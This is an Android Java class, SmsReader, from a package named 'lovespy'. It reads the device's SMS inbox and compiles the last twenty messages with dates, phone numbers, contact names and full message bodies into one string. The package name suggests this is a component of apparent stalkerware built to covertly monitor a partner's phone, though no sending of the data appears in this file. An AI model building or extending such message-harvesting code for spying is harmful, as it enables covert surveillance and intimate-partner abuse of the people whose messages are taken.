package com.example.lovespy.app.sms;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class SmsReader {

    private Context mContext;

    public SmsReader(Context context) {
        mContext = context;
    }

    public String getSmsList() {
        Uri smsUri = Uri.parse("content://sms/");
        SmsHelper smsHelper = new SmsHelper(mContext);
        Cursor cur = mContext.getContentResolver().query(smsUri, null, null, null, null);
        String sms = "";
        int n = 0;
        while (cur.moveToNext() && n++ < 20) {
            String number = cur.getString(cur.getColumnIndexOrThrow("address"));
            sms += "Date: "+ smsHelper.convertDate(cur.getLong(cur.getColumnIndexOrThrow("date")))+"\n";
            sms += "Type: "+smsHelper.getSmsTypeName(cur.getInt(cur.getColumnIndexOrThrow("type")))+"\n";
            if (number != null) {
                sms += "Number: "+number+"\n";
            } else {
                number = smsHelper.getNumber(cur.getString(cur.getColumnIndexOrThrow("thread_id")));
                sms += "Number: "+number+"\n";
            }
            sms += "Name: "+smsHelper.getContactName(number)+"\n";
            sms += "Body: "+smsHelper.removeNewLine(cur.getString(cur.getColumnIndexOrThrow("body")))+"\n";
            sms += "_______________"+"\n\n";
        }
        cur.close();
        return sms;
    }
}
